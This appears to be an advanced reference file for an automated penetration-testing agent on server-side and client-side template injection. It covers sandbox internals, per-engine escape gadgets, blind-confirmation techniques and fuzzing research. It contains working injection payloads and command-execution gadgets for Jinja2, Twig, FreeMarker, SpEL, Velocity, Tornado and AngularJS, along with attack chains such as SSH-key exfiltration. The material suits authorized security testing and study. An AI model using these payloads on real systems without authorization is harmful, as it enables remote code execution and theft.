---
name: ssti-advanced-deep
description: Advanced server-side template injection depth — Jinja2 SandboxedEnvironment source dissection, per-engine sandbox-escape gadget catalog, expression-context differentials, blind-SSTI confirmation methodology, CSTI crossover, and the TEFuzz (USENIX'23) baseline and successor detection frontier.
sibling: ssti
load_when: scan_mode == "deep"
---

# SSTI — Advanced Depth

This is the advanced+expert deep sibling to `ssti.md`. The base owns the technique-class primitive tour, engine fingerprinting, the confirmation-without-RCE ladder, the SSTI+LLM crossover class introduction, the CI/CD expression-injection class shape, framework-layer SSTI, and chaining; the novel sibling `ssti_novel_deep.md` owns the 2024–2026 canonical CVE version/fix tables (Jinja2 CVE-2025-27516, Twig CVE-2024-45411 and Symfony CVE-2026-46636, Grav CVE-2024-28118/28119/CVE-2025-66294, banks/Haystack/spacy-llm SSTI+LLM cluster, Handlebars March 2026 wave, Argo CVE-2026-31892 cluster). This file owns the advanced-tier depth: Jinja2 `SandboxedEnvironment` source-level dissection, per-engine sandbox-escape gadget catalogs, expression-context differentials, blind-SSTI methodology beyond the base's ladder, client-side template injection (CSTI) crossover, and the TEFuzz-and-successor detection-frontier framing — all routed by filename.

## Jinja2 `SandboxedEnvironment` — Source-Level Dissection

The canonical framing depends on understanding exactly what `SandboxedEnvironment` blocks and what it does not. The verbatim source (`src/jinja2/sandbox.py`) defines the sandbox surface:

**`is_safe_attribute(obj, attr, value)`** returns `not (attr.startswith("_") or is_internal_attribute(obj, attr))`. This blocks every leading-underscore attribute — `__class__`, `__mro__`, `__globals__`, `__init__`, `__subclasses__`, `__bases__`, `__builtins__`. The classical Python-SSTI reflection walk fails at the first hop because `''.__class__` triggers the leading-underscore guard.

**`is_safe_callable(obj)`** returns `not (getattr(obj, "unsafe_callable", False) or getattr(obj, "alters_data", False))`. This blocks callables that are annotated as unsafe or as data-altering. Django models' `save`, `delete`, etc. are marked `alters_data=True` (via Django's own annotation) and refuse to fire in a sandboxed context.

**Unsafe attribute sets**:
- `UNSAFE_GENERATOR_ATTRIBUTES = {"gi_frame", "gi_code"}` — generator internals.
- `UNSAFE_COROUTINE_ATTRIBUTES = {"cr_frame", "cr_code"}` — coroutine internals.
- `UNSAFE_ASYNC_GENERATOR_ATTRIBUTES = {"ag_code", "ag_frame"}` — async-generator internals.
- `UNSAFE_FUNCTION_ATTRIBUTES` and `UNSAFE_METHOD_ATTRIBUTES` — both empty sets in modern Jinja2.

The empty function/method attribute sets mean that once you have a callable in the sandbox, its normal method calls fire. The blocked path is the *reflection walk to acquire the callable*, not the invocation itself.

**What `SandboxedEnvironment` blocks (directly)**:
- Any `__foo__` attribute access on any object.
- Any `alters_data=True` method invocation (Django-annotated).
- Access to generator/coroutine/async-generator internal frames.
- Direct calls to `str.format` (per CVE-2016-10745 fix — the `format` method itself is blocked because it can reach `__class__`).

**What `SandboxedEnvironment` does NOT block**:
- Normal attribute access (`obj.attr` where `attr` is not underscore-prefixed).
- Normal callable invocation (`func(args)` where `func` is not marked unsafe).
- Filter and test invocations (`{{x|filter}}`, `{{x is test}}`).
- Import statements (Jinja doesn't have import in template syntax anyway; this is not the sandbox's job).
- The `str.format` string method's *replacement* — historically, some filter or attribute-lookup path could re-acquire `format` and reach `__class__` through it. This is the CVE-2025-27516 class shape: the `|attr` filter (pre-3.1.6) returned `str.format` when passed `'format'` as the attribute name, and the returned callable was NOT wrapped by the sandbox, so calling it reached `__class__` and completed the reflection walk. Load `ssti_novel_deep.md § Jinja2 |attr Filter Sandbox Escape — CVE-2025-27516` for the exact mechanism and payload.

**The generalizable sandbox-escape pattern in Jinja2**: find a filter or attribute-lookup path that returns a callable which was not passed through `is_safe_callable`. Any such path is a bypass. Historical examples beyond CVE-2025-27516:
- `|xmlattr` filter mishandled certain attribute names (CVE-2024 GHSA cluster).
- Malicious filenames as template loader input (CVE-2024 GHSA cluster).

The sandbox is defense-in-depth, not a security boundary. The Jinja docs verbatim state: "The sandbox alone is not a solution for perfect security. There is nothing you can really do against local denial of service attacks. It's also possible to construct a relatively small template that renders to a very large amount of output."

**Autoescape and the sandbox are orthogonal** — `autoescape=True` HTML-escapes the *output*; sandbox restricts the *evaluation*. Both can be enabled independently. A template with autoescape but no sandbox is XSS-safe but SSTI-unsafe (evaluation reaches Python code, just the output is HTML-encoded).

**Detection of sandbox mode** — attempt `{{ ''.__class__ }}`. On `Environment` this renders `<class 'str'>`; on `SandboxedEnvironment` this raises `SecurityError` and (depending on the app's error handling) either shows the exception or renders nothing/an error page. If nothing renders, try `{{ ''.upper() }}` — a normal attribute access — to confirm the template engine is running at all.

## Per-Engine Sandbox-Escape Gadget Catalog

### Jinja2 sandbox escapes (mechanism)

Beyond the CVE-2025-27516 `|attr` → `str.format` path, historical and generic escape shapes:

**`|attr` filter with an underscore-prefixed name**. Pre-CVE-2025-27516 fix, `|attr('__class__')` bypassed `is_safe_attribute` because the filter used raw `getattr` rather than the environment's sandboxed attribute lookup. The fix (CVE-2025-27516) routed `do_attr` through `environment.getattr`. Any pre-3.1.6 target with `SandboxedEnvironment` remains exploitable via this path.

**`|xmlattr` HTML injection**. Two GHSAs (Jan 2024, May 2024) landed on the `|xmlattr` filter — attacker-controlled attribute names passed to the filter reached HTML-injection contexts, allowing script tags to be smuggled through an otherwise sandboxed environment.

**Malicious template filenames**. Two GHSAs (Dec 2024) landed on the template-loader path — a template filename that contains specific characters could reach sandbox breakout via indirect format-string references.

**Generic escape via non-underscored aliases**. Some framework globals expose reflection-adjacent functionality via non-underscored attribute names. Flask's `request.application.__globals__` is blocked, but `request.blueprints` (or similar) may reach app-registered globals that themselves have reflection access.

**Filter chaining that produces an escaped value**. A filter pipeline `{{ obj|list|first|attr('...') }}` may reach an object type whose `|attr` behavior differs from the source object's; if any intermediate produces a value whose sandbox handling is looser, the pipeline reaches reflection.

### Twig sandbox escapes

**`_self.env` path (Twig 1.x historical)**. `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}` — the canonical Twig sandbox-escape. Patched in Twig 2.x/3.x where `_self` returns the template name (a string) rather than the template object.

**`_context` access**. Some Twig configurations expose `_context` (the full render context) to templates; if `_context` includes anything reflection-adjacent, the sandbox is bypassed via context walking.

**`template_from_string` extension (StringLoaderExtension)**. When the `StringLoaderExtension` is loaded (default in Symfony), `{{ include(template_from_string(env, userInput)) }}` evaluates `userInput` as a new Twig template. If the outer template is sandboxed but the string-loaded inner template inherits a less-restrictive environment, the sandbox is bypassed.

**Three-condition sandbox bypass (CVE-2024-45411)**. Sandbox skipped when: (a) sandbox globally disabled, (b) sandbox enabled only via an `include('name')` call referencing a template by name (not by Template/TemplateWrapper instance), and (c) the included template was previously loaded in a non-sandboxed context. Load `ssti_novel_deep.md § Twig CVE-2024-45411 — Three-Condition Sandbox Bypass` for the mechanism.

**Symfony-specific Twig sandbox bypass (CVE-2026-46636)**. Symfony's Twig integration has additional escape surface; load `ssti_novel_deep.md` for the details.

**Grav CMS Twig cluster**. Grav exposes Twig-engine access at multiple unsafe surfaces (`grav.twig.twig.registerUndefinedFunctionCallback`, `grav.twig.twig.extensions.core.setEscaper`, `evaluate_twig`). Grav-specific CVE cluster: CVE-2024-28118, CVE-2024-28119, CVE-2025-66294 — load `ssti_novel_deep.md`.

### FreeMarker sandbox escapes

**`?new` builtin with `TemplateClassResolver` misconfiguration**. FreeMarker's `Configuration.setNewBuiltinClassResolver(TemplateClassResolver)` selects the resolver used by the `?new` builtin. The documented resolvers are:
- `UNRESTRICTED_RESOLVER` — the default, allows any class. Any target with the default configuration is exploitable via `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
- `ALLOWS_NOTHING_RESOLVER` — blocks all `?new` invocations.
- `SAFER_RESOLVER` — blocks `ObjectConstructor`, `Execute`, `JythonRuntime` specifically.

The bypass surface on `SAFER_RESOLVER`: any Java class not in the block list. `freemarker.template.utility.ObjectConstructor` is blocked, but any custom class the app registers as a builtin is allowed. Grep the FreeMarker configuration for `setSharedVariable` / `setSharedVariables` calls that register app-specific classes.

**`?api` builtin bypass (pre-2.3.30)**. The `?api` conversion allows a template to call arbitrary Java API methods on any value; pre-2.3.30 this was on by default. Post-2.3.30 it requires `<setting name="api_builtin_enabled">true</setting>`. Grep for that setting.

**Object-wrapper differentials**. FreeMarker's `ObjectWrapper` decides how Java objects are exposed to templates. The `DefaultObjectWrapper` exposes methods; a restricted wrapper (e.g., `SimpleObjectWrapper`) exposes only basic types. Apps using restricted wrappers block direct method invocation but may still reach reflection via context objects.

**`TemplateDirectiveModel` and `TemplateMethodModel` custom implementations**. Any app-registered custom directive or method that internally reaches unsafe reflection is a bypass surface.

### Velocity sandbox escapes

**Default `UberspectImpl` vs `SecureUberspector`**. The Uberspector controls reflection introspection. Default `UberspectImpl` allows `$class.forName`, `getMethod`, `invoke` — the classical chain. `SecureUberspector` blocks classloader-related method calls, breaking the reflection chain. Configure via `runtime.introspector.uberspect` (which takes a list of Uberspector class names — the ordering matters).

**Velocity Tools `$class` (ClassTool)** — if the deployment uses Velocity Tools, `$class` is often in scope even with `SecureUberspector`. `$class.inspect("java.lang.Runtime")` returns a `ClassTool` wrapping `Runtime`; `getRuntime` and `exec` are then reachable via the wrapper's method-invocation surface, which may or may not be gated by `SecureUberspector` depending on version.

**`$math`, `$number`, `$date` tool escape** — if any tool exposes a method that returns a reflection-capable object, that object's methods are the escape surface.

**String reflection**. `#set($s = "")` then `$s.class.forName("java.lang.Runtime")...` — the string-class-reflection path. Blocked by `SecureUberspector`; reachable on default configurations.

### Smarty sandbox escapes

**`SmartySecurity` allow-list mechanism**. The `SmartySecurity` class provides `$allow_super_globals`, `$php_functions` (allow-listed PHP functions), `$php_modifiers` (allow-listed modifiers), `$static_classes` (allow-listed static classes), `$trusted_dir`, `$trusted_uri`, `$streams`, `$secure_dir`. An unconfigured `SmartySecurity` is more restrictive than no security at all but still allows a lot; audit the specific configuration.

**`{fetch}` SSRF bypass via `$trusted_uri` redirect**. Smarty CVE cluster (2026-07) — `{fetch}` fetches a URL and outputs it; the trusted-URI check happens on the initial URL but not on the redirect target. An attacker-controlled URL that redirects to an internal-only URL reaches SSRF.

**Symlink traversal out of `$trusted_dir`**. Same 2026-07 cluster — filesystem access via symlinks in a trusted directory that point outside.

**`stream:` resource bypass**. Same cluster — `SmartySecurity`'s `$streams` allow-list is bypassable via specific stream wrappers.

**`{extends}` PHP-code injection (2024-05)**. `{extends}` tag attribute value reached PHP code execution in a specific unpatched Smarty configuration.

Load `ssti_novel_deep.md § Smarty 2024–2026 Cluster` for the per-CVE version tables and mechanisms.

### Handlebars sandbox escapes

Handlebars is more restricted than the Python/Java template engines by design; the primary attack surface is not "escape the sandbox" but "abuse the compile step to inject JavaScript into the compiled function."

**AST-type-confusion (Critical)**. The compile step accepts an AST that misrepresents its node types; the generated function includes attacker-controlled JavaScript. Attack shape: the AST node is a plain object with type-specific fields, but the compile step type-checks laxly; a crafted AST with a `type: 'PathExpression'` but with fields from a different node type produces compiled code that includes the field data as executable JavaScript.

**`@partial-block` reference to dynamic partials**. The `@partial-block` reference to a dynamic partial resolves at render time; a user-controlled partial name reaches unexpected registered partials.

**Prototype pollution → XSS via partial injection**. Pollution of `Object.prototype` reaches partial resolution.

**`__lookupSetter__` blocklist gap**. Missing blocklist entry for `__lookupSetter__` allows an escape.

**CLI precompiler unescaped names**. Not runtime SSTI but build-time — attacker-controlled template names in the CLI reach the compiled output.

Load `ssti_novel_deep.md § Handlebars March 2026 Wave` for the eight-advisory catalog.

## Expression-Context Differentials

Template expressions evaluate in a context — the set of variables and helpers available at that point. Context differentials are a class of bypass where the expression means different things at different evaluation sites.

**Two-phase evaluation (Thymeleaf preprocessing)**. `__${expression}__` is preprocessed: the inner expression is evaluated first, its result becomes part of the outer expression, then the outer expression is evaluated. This means a user-controlled inner expression that produces `T(java.lang.Runtime).getRuntime().exec('id')` becomes the outer SpEL to evaluate. Under sandbox restrictions, the inner phase may have different rules than the outer.

**Include vs render context**. In Jinja2, `{% include %}` inherits the parent's context; `{% include with context %}` and `{% include without context %}` control inheritance explicitly. A sandbox that hardens the parent but leaves the included template unsandboxed has a context-differential bypass.

**Macro definitions and closures**. Templates can define macros that close over the definition-site context; a macro defined in a permissive context but called in a restrictive one may retain the definition-site's permissions.

**Template inheritance**. Twig/Jinja `{% extends %}` chains a child template's blocks over a parent's; the sandbox mode of the parent may differ from the child.

**Autoescape context switch**. Templates can toggle autoescape mid-render (`{% autoescape false %}...{% endautoescape %}` in Jinja/Twig). A section with autoescape off is not sandbox-off, but it removes one defense layer.

**Global vs local scope**. `set` statements in Jinja/Twig can create globals; a macro that assigns to a global var affects subsequent renders. Some sandbox configurations forget to freeze the global namespace.

**Filter argument evaluation**. `{{ x | filter(userInput) }}` — the filter's arguments evaluate in the outer context. If the filter itself internally re-evaluates its arguments (via `Environment.compile_expression` or equivalent), the user input reaches the compile path with different context.

**Cross-language expression evaluation**. Thymeleaf allows SpEL expressions embedded in HTML attributes; the SpEL engine runs with its own SecurityContext that may or may not integrate with Spring Security's context. A user-controlled `${...}` in a `th:attr` may evaluate with a different security posture than a `${...}` in a `th:utext`.

## Blind SSTI — Advanced Confirmation Methodology

Beyond the base's ladder, the advanced techniques for confirming SSTI without observable RCE:

**Response-header injection via template**. Some template engines can influence response headers (via directive-based header manipulation, or via Django's `add_header` template tag equivalents). A blind SSTI that reaches header output is observable as a modified response header.

**Timing side channel with per-engine sleep primitives**:
- Jinja2: `{{ cycler.__init__.__globals__.__import__('time').sleep(5) }}` (or the `request.application.__globals__.__builtins__` walk in Flask).
- Twig: `{{ "sleep 5"|filter('exec') }}` (when the filter is available).
- SpEL: `${T(java.lang.Thread).sleep(5000)}`.
- Velocity: `#set($t = "".class.forName("java.lang.Thread").getMethod("sleep", "".class.forName("long")).invoke(null, 5000))`.
- Freemarker: no direct sleep; use `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}` if the resolver allows.
- ERB: `<% sleep 5 %>`.
- EJS: `<%= new Promise(r => setTimeout(r, 5000)) %>` (works because of the awaited render).

**Storage-side confirmation**. A template that writes to a file, cache, or database, then a subsequent unauthenticated read of that location confirms.

**Header size / body length differential**. A template that produces output whose length depends on the evaluation result. Even without visible output, `Content-Length` differs, or ETag differs, or gzip compression ratios shift.

**Error-message extraction**. A crafted payload that produces a class-name in the error stack; the class name is the covert channel.

**Cross-request timing correlation**. Fire the payload, then fire a follow-up request that reads the timing baseline. If the payload caused sustained resource consumption (e.g., a spin loop), the follow-up baseline shifts.

**DNS lookup with server-side resolver**. Even when direct HTTP egress is blocked, DNS often is not — the target's own DNS resolver may reach an authoritative name server the attacker controls. The template payload triggers a DNS lookup; the attacker's authoritative NS logs the query.

**File-descriptor exhaustion probe**. A template that opens many file descriptors (e.g., a loop that opens `/dev/null` in a language-native way). If the target exhibits file-descriptor exhaustion symptoms (500 errors on subsequent requests, service restart), the template evaluated. Destructive; use only in authorized testing.

**Response-status code manipulation**. Some engines can influence the response status via directives; a template that returns a specific status confirms execution.

## Client-Side Template Injection (CSTI) — Crossover

Client-side template engines that evaluate expressions in the DOM (AngularJS, Vue in-DOM templates, Handlebars helpers, lodash templates) turn injected `{{}}`/`${}` into script execution in the browser. This is CSTI, not SSTI — the impact is XSS-shaped (browser-side code execution) rather than RCE — but the class shape overlaps enough that the SSTI file covers the surface here and routes the DOM-side to `xss.md`.

**AngularJS expression sandbox removal (v1.6+)**. AngularJS pre-1.6 had an expression sandbox that blocked `constructor` walks. Angular 1.6 removed the sandbox entirely (per the team's decision that the sandbox was not a security boundary); any `{{}}` interpolation of user input on AngularJS 1.6+ is direct script execution. Payloads:
```
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

Route to `xss.md § Client-Side Template Injection` for the DOM-side handling.

**Vue in-DOM template compilation (Vue 2 and Vue 3 full-build)**. Vue's in-DOM template mode compiles the mounted element's HTML as a template; user content in the mounted DOM is evaluated. Runtime-only builds are not affected. Payload:
```
{{_c.constructor('alert(1)')()}}
```

**Handlebars runtime**. On the browser side, `Handlebars.compile(userInput)` compiles user content as a template; the compiled function runs on invocation. The compile-step itself does not execute, but the returned function does when called.

**lodash templates (`_.template`)**. `_.template(userInput)` compiles user content into a JavaScript function; call sites execute.

**htmx expression contexts**. htmx has attributes that accept JavaScript-adjacent expressions: `hx-vals`, `hx-target`, `hx-on:<event>`, `hx-swap-oob`. Attacker-controlled markup with these attributes reaches DOM-side execution similar to CSTI. Route to `xss.md § htmx sinks` for the DOM-side.

**AlpineJS `x-html`, `x-init`, `x-on:<event>`**. Alpine's directive syntax evaluates JavaScript expressions in scope; injected markup with these directives is CSTI. Alpine v3 introduced CSP-safe mode which restricts the evaluation surface.

**Class abstraction**: CSTI is XSS-shaped in impact but SSTI-shaped in mechanism (template engine evaluating expressions). The pen-testing decision is where to route the finding: CSTI proves DOM execution in the browser, so `xss.md` handles the exploitation; but the class-detection payload is a template-injection probe, so it lives adjacent to SSTI here.

## TEFuzz Baseline and Detection Frontier

**TEFuzz (USENIX'23)** — the canonical template-engine fuzzing paper. Establishes a methodology for automated SSTI discovery: differential fuzzing across multiple template engines, generating inputs that produce different outputs across engines to identify divergences that indicate template-syntax evaluation. The paper's contribution is a fuzzer that finds new SSTI-adjacent bugs by input mutation and cross-engine differential observation.

**Detection landscape**:
- **tplmap / SSTImap** — the classical automated scanners; effective at fingerprinting and firing known gadgets but blind to novel classes.
- **TEFuzz-style differential fuzzing** — the modern approach for finding novel classes; requires setting up a fuzzing harness with the target engine's source or a black-box wrapper.
- **CodeQL / Semgrep custom rules** — for source-available analysis, custom rules can detect the `render_template_string(user_input)` / `Template(user_input)` / `template_from_string(user_input)` sink pattern across languages.
- **Runtime instrumentation** — hooking the template engine's compile/render methods and observing whether they receive user-influenced input.

**Successor work (2024–2026)** — the frontier has extended TEFuzz with LLM-guided input generation and with sandbox-escape-specific mutation strategies. Verified successor work is limited in the current research pool; the class abstraction is "differential fuzzing across sandbox modes" as the next-tier detection approach.

**Practical use for pen-testers**: use tplmap/SSTImap for initial triage; when they find a suspicious engine but no known gadget fires, either fall back to manual probe iteration or set up a TEFuzz-style differential harness. The tools do not replace hand-audit for novel classes.

## Detection Payload Matrix at Advanced Depth

The base's fingerprint matrix (`{{7*7}}`/`${7*7}`/`<%=7*7%>`/`#{7*7}`) covers the top-level identification. Advanced-tier probes narrow further within each engine.

**Distinguishing Jinja from Twig** (both use `{{...}}`):
- `{{7*'7'}}` — Jinja evaluates to `7777777` (string repetition); Twig evaluates to `49` (numeric coercion).
- `{{7|upper}}` — Twig errors; Jinja errors differently.
- `{{ range(0, 3) }}` — Jinja renders `range(0, 3)`; Twig renders `[0, 1, 2]`.

**Distinguishing FreeMarker from Velocity from SpEL** (all use `${...}`):
- `${7?c}` — FreeMarker renders `7` (using the `?c` builtin); Velocity errors; SpEL errors.
- `${T(java.lang.Class)}` — SpEL renders `class java.lang.Class`; FreeMarker and Velocity error.
- `<#assign x = 7>${x?c}` — FreeMarker only.
- `#set($x = 7)$x` — Velocity only.

**Distinguishing ERB from EJS** (both use `<%=%>`):
- `<%= [1,2].push(3) %>` — EJS (JavaScript) renders `3` (push returns new length); ERB renders `[1, 2, 3]` (Ruby array).
- `<%= self %>` — ERB renders `main`; EJS errors.

**Distinguishing engine sub-versions**:
- Twig 1.x vs 2.x/3.x: `{{ _self }}` renders the template object (1.x) or the template name string (2.x/3.x).
- Jinja 2.x vs 3.x: `{{ 'a b'.split() }}` — Jinja 3.x has this feature; some 2.x versions differ.
- SnakeYAML 1.x vs 2.x: `!!javax.script.ScriptEngineManager` — 1.x accepts, 2.x rejects (default SafeConstructor).

**Blind fingerprint via response timing**:
- A short sleep (1s) via each engine's sleep primitive tests whether the engine matches the hypothesis. If a `${T(java.lang.Thread).sleep(1000)}` payload produces a 1-second response delay, SpEL is confirmed. If a `{{ cycler.__init__.__globals__.__import__('time').sleep(1) }}` payload produces the same delay, Jinja + Flask context is confirmed.

**Blind fingerprint via error message extraction**:
- Malformed payloads produce error messages that are engine-specific. A `{{` without `}}` produces different errors across Jinja / Twig / Nunjucks. If any error is observable (in the response body, in an admin error log, in an email delivery failure), the engine is fingerprinted.

## SSTI-to-RCE Gadget Catalog Per Engine

The classes of objects reachable from a sandboxed context that provide subprocess/exec — organized by engine.

### Python (Jinja2, Mako)

- `os.system` / `os.popen` — reachable via `__import__('os')` or a stored global.
- `subprocess.Popen` — reachable via `subprocess.Popen(['cmd'], stdout=-1).communicate()[0]`.
- `builtins.eval` / `builtins.exec` — reachable via a builtins reference.
- `__import__` — the top-level import mechanism; reachable via `__builtins__['__import__']`.
- `popen` on `os._wrap_close` — the reliable class-walk target because `os` is always imported.
- Any C-extension module that exposes reflection: `ctypes`, `mmap`, `platform`.

### Java (Velocity, Freemarker, Thymeleaf, SpEL)

- `Runtime.getRuntime().exec("cmd")` — the classical primitive.
- `ProcessBuilder("cmd").start()` — alternative.
- `freemarker.template.utility.Execute` — Freemarker-specific gadget; returns the command output as a string directly.
- `javax.script.ScriptEngineManager` — reaches JavaScript-engine RCE via `getEngineByName("js").eval(...)`.
- `org.apache.commons.io.IOUtils.toString(inputStream)` — captures process output as string when Apache Commons IO is on classpath.
- `sun.misc.Unsafe.putObject` — internal reflection.
- Static-method invocation via `T(...)` in SpEL: `T(java.lang.System).getenv()`, `T(java.lang.System).exit(0)`, etc.

### Ruby (ERB, Haml, Slim)

- Backticks: `` `cmd` `` — the shortest command primitive.
- `system("cmd")` — returns exit status.
- `%x{cmd}` — same as backticks.
- `IO.popen("cmd").read` — captures output.
- `Open3.capture2("cmd")` — captures stdout separately from stderr.
- `Kernel.eval("code")` — arbitrary Ruby code.

### JavaScript / Node (EJS, Nunjucks, Handlebars)

- `require('child_process').execSync('cmd').toString()` — the classical primitive.
- `require('child_process').exec('cmd', callback)` — async variant.
- `require('child_process').spawn('cmd', args)` — process control.
- `process.mainModule.require('child_process')` — deprecated but still works on many Node versions.
- `Function('return process')().mainModule.require('child_process')` — reachable when direct `require` is blocked.
- `require('fs').writeFileSync(path, data)` — file write.
- `require('vm').runInNewContext(code)` — code execution (not sandbox even though called "vm").

### PHP (Twig, Smarty, Blade)

- `system("cmd")` — top primitive.
- `passthru("cmd")` — same, prints to stdout.
- `exec("cmd", $output)` — captures output array.
- `shell_exec("cmd")` — captures output string.
- Backticks: `` `cmd` `` — same as `shell_exec`.
- `popen("cmd", "r")` — process handle.
- `eval("php-code")` — arbitrary PHP.
- `assert("php-code")` — PHP ≤ 7.0 evaluates the assertion argument (removed in later versions).
- `preg_replace("/x/e", "phpcode", $subject)` — the `/e` modifier, removed in PHP 7.0.

### .NET (Razor, RazorEngine)

- `System.Diagnostics.Process.Start("cmd", "args")` — the top primitive.
- `System.Reflection.Assembly.LoadFrom(userPath)` — load an attacker DLL.
- Any `csharp` code in a Razor template compiles to C# directly — no sandbox exists.

**Class abstraction — the gadget catalog per engine is small**. Once the engine and sandbox mode are known, the specific gadget follows in one or two steps. The audit's cost is in the fingerprinting and reachability confirmation, not in the gadget selection.

## Chain-Primitive Composition — Advanced SSTI Cases

Beyond the base's chaining catalog, advanced SSTI-composed chains:

**SSTI → in-container file read → SSH key exfil → lateral SSH**. The template evaluates and reads `~/.ssh/id_rsa`; the key is exfiltrated via the response body. Attacker then uses the key to SSH to adjacent hosts.

**SSTI → in-container env var read → cloud-role assume → cross-account access**. The template evaluates and reads `$AWS_ROLE_ARN` / `$AWS_WEB_IDENTITY_TOKEN_FILE`; attacker uses `sts:AssumeRole` to obtain credentials.

**SSTI → response-header manipulation → cache poisoning → user-tier XSS**. The template evaluates and adds a header; the header is cached by a downstream cache and served to other users. Route to `cache_poisoning.md`.

**SSTI → template-source write → persistent template poisoning**. The template evaluates and writes a new template to the template-loader search path; every subsequent render loads the poisoned template. Persistence via SSTI.

**SSTI → JEP-290-filter-configuration modification → subsequent-deserialization RCE**. On Java targets, the SSTI-derived RCE can call `ObjectInputFilter.Config.setSerialFilter(null)` to disable the deserialization filter; a subsequent deserialization attack on the same process reaches the sink. Route to `insecure_deserialization.md`.

**SSTI → LDAP query construction → LDAP injection**. Templates that construct LDAP queries from user input reach LDAP injection with the SSTI as the query-construction primitive.

**SSTI + prototype pollution (Node)**. A Node SSTI whose template reaches prototype pollution (via `Object.assign` or similar in a helper) can pollute `Object.prototype` and affect adjacent request handling. Route to `prototype_pollution.md`.

**SSTI + XXE (Java)**. A Java template with SpEL that reaches `SAXParser.parse(InputSource)` with attacker-controlled XML enables XXE from within the SSTI. Route to `xxe.md`.

**SSTI + PDF-render-with-JavaScript**. A template rendered to PDF (via headless-browser or wkhtmltopdf) that includes attacker-controlled JavaScript can reach filesystem operations via the PDF-rendering process's privileges. Route to `xss.md § Blind & Stored XSS` for the PDF-side handling.

## Advanced Testing Methodology

**Version-aware payload selection**. Given the engine fingerprint, select payloads that match the specific version's known vulnerabilities. Load the `ssti_novel_deep.md § CVE tables` and match the target version against the affected range.

**Multi-endpoint probe sweep**. For a target with multiple endpoints, run the fingerprint probe across all of them. Different endpoints may use different template engines (e.g., a website uses Handlebars but the admin panel uses Jinja). Each engine is a distinct finding.

**Blind probe with per-engine timing baselines**. Before firing timing probes, baseline the target's response-time distribution. A 5-second sleep against a target with ±3s jitter is unreliable; against a target with 100ms jitter it is definitive.

**Framework-context-aware fingerprint**. Once the engine is identified, fingerprint the framework wrapper. Flask + Jinja exposes `{{ config }}`, `{{ request }}`, `{{ g }}`. Django + Django templates exposes `{{ user }}`, `{{ csrf_token }}`. Symfony + Twig exposes the Symfony service container.

**Wire-trace capture**. Every advanced-tier finding attaches a full HTTP wire trace (request + response). For blind findings, attach the callback log (OAST) or the timing measurement.

**Reproducibility test**. Retry the exploit against an adjacent instance of the same app. If the exploit fires on prod but not on staging (assuming staging is patched or configured differently), the difference isolates the finding to specific config or version.

**Fuzz for novel classes**. When the target's engine is unusual or the sandbox mode is unfamiliar, use a TEFuzz-style approach: submit systematically-varied payloads and observe response differentials. New classes surface as unexpected behavior on inputs that superficially look benign.

## Advanced Java Engines

Beyond Velocity/Freemarker/Thymeleaf, several Java template systems have their own SSTI surface worth naming at advanced depth.

**JSP EL (Expression Language)**. Historically the JSP-standard expression language; `${...}` in a JSP page evaluates via the JSP EL resolver. Attack surface: any JSP that renders user input inside a `${...}` context. Modern JSPs are less common but legacy Java-EE deployments frequently expose them. Payloads:
```
${T(java.lang.Runtime).getRuntime().exec("id")}
${request.getServletContext().getRealPath("")}
```

**Groovy templates**. Groovy's `GStringTemplateEngine` and `StreamingTemplateEngine` accept Groovy syntax embedded in `${...}` and `<%= %>`; the language is Groovy so anything Groovy-callable is reachable. Any Jenkinsfile-adjacent code path or Spring Boot's Groovy support is a candidate.

**Nashorn / Rhino JavaScript engines**. Java can embed JavaScript via `javax.script.ScriptEngineManager`. A template that reaches `getEngineByName("js").eval(userInput)` executes arbitrary JavaScript in the JVM. Nashorn was deprecated in JDK 11 and removed in JDK 15, but Rhino (as a separate library) fills the same role in modern apps.

**Spring Cloud Gateway routes**. Gateway routes accept SpEL expressions in their predicates and filters; user-influenced route configuration reaches SpEL evaluation. Not classical SSTI but the same primitive.

**Spring Boot Actuator endpoints**. `/actuator/env` and `/actuator/refresh` in specific configurations can reach property-source-based expression evaluation; historical CVE-2022-22963 (Cloud Function) and CVE-2022-22965 (Spring4Shell) were expression-adjacent.

**Rhino/JavaScript template libraries**. `handlebars-java`, `mustache-java` — Java implementations of JS template languages, with their own gadget surfaces distinct from the JS-native versions.

## Advanced Python Engines

Beyond Jinja2/Mako, Python has additional template surfaces.

**Django template language (DTL)**. Not Jinja-shape — DTL is explicitly designed as a limited-power template language that does not permit arbitrary Python. However: `{% include %}` and `{% extends %}` with user-controlled template names reach path-traversal-shape file access; custom template tags with `takes_context=True` reach the render context.

**Tornado template**. Tornado's built-in template engine allows arbitrary Python inside `{% ... %}` blocks:
```
{% import os %}{{ os.popen('id').read() }}
```

**Chameleon**. XML-shape template engine used by Pyramid. `${...}` and `<tal:...>` evaluate Python; attacker-controlled template source reaches RCE via reflection.

**Genshi**. Another XML-shape engine; less common but present in some Python enterprise stacks.

**Mako** (already in base) — compiles to Python, no sandbox. `<% python-code %>` blocks are direct execution.

**string.Template (stdlib)**. `${var}` substitution only, no expression evaluation — not SSTI-shape; substitution failures do not reach code execution. Documented for the negative-case reference.

**format-string vs template**. `str.format(**{})` with user-controlled format strings reaches attribute access (`{0.__class__}`), which historically was the class-walk primitive on `SandboxedEnvironment` (via the `|attr` → `format` chain — the CVE-2025-27516 mechanism).

## TEFuzz Baseline — Deeper

**Paper: "TEFuzz: Detecting Vulnerabilities in Template Engines via Differential Fuzzing"** (USENIX Security '23). The methodology:

1. **Setup**: instrument N template engines to accept the same input and observe output plus internal state (function-call trace).
2. **Input generation**: mutate seed inputs (valid templates in each engine's syntax) using grammar-aware mutations.
3. **Cross-engine differential**: identify inputs where two or more engines produce semantically different outputs or trigger different function calls.
4. **Triage**: differentiate legitimate cross-engine syntactic differences from actual bugs (e.g., a parse error in engine A but not engine B suggests a parser bug in B).

The paper's contribution:
- A set of previously-unknown bugs discovered in mainstream template engines.
- A reusable differential-fuzzing harness for template-engine research.
- Methodology transferable to other cross-tool differential analysis.

**Successor work landscape (2024–2026)**:
- The frontier is extending TEFuzz's approach with LLM-guided input generation, where an LLM produces target-engine-specific mutations that a random fuzzer would not.
- Sandbox-escape-specific mutation strategies: mutations designed to trigger the `Environment` vs `SandboxedEnvironment` differential specifically.
- Cross-language template-engine analysis: comparing Jinja2 to Twig to Handlebars for shared class-shape bugs.
- The `ssti_novel_deep.md` file tracks any specific 2024–2026 successor papers if they surface in the primary-source research.

